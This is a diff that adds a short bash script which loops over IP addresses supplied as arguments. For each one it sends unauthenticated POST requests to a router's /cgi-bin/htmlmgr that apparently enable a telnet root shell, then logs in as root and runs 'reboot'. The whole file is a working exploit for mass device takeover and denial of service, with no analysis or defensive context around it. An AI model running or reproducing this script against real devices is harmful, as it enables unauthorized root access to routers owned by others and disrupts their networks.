@@ -1,0 +1,28 @@
+#!/bin/bash
+
+HOSTS=( $* )
+
+for IP in "${HOSTS[@]}"
+do
+
+	curl -s -H "Host: $IP" -d"%3Asys%3ASystem.Baptization.Telnetd=1&_okdir=spec&_okpage=result&_okfollowdir=status&_okfollowpage=wireless&_okplain=1&_oktype=wlanstatus&_file=%2Fwgl%2Fmain.wgl&_style=std&_lang=&_dir=wireless&_page=wps&_idx=&_sid=&_csrf=" -X POST http://$IP/cgi-bin/htmlmgr > /dev/null
+	curl -s -H "Host: $IP" -d"%3Asys%3ASystem.Baptization.shell=1&_okdir=spec&_okpage=result&_okfollowdir=status&_okfollowpage=wireless&_okplain=1&_oktype=wlanstatus&_file=%2Fwgl%2Fmain.wgl&_style=std&_lang=&_dir=wireless&_page=wps&_idx=&_sid=&_csrf=" -X POST http://$IP/cgi-bin/htmlmgr > /dev/null
+
+	sleep 5
+
+	HOST=$IP
+	USER='root'
+	CMD='reboot'
+
+	(
+	echo open "$HOST"
+	sleep 2
+	echo "$USER"
+	sleep 2
+	echo "$CMD"
+	sleep 2
+	echo "exit"
+	) | telnet > /dev/null 2>&1
+
+done
+exit 0
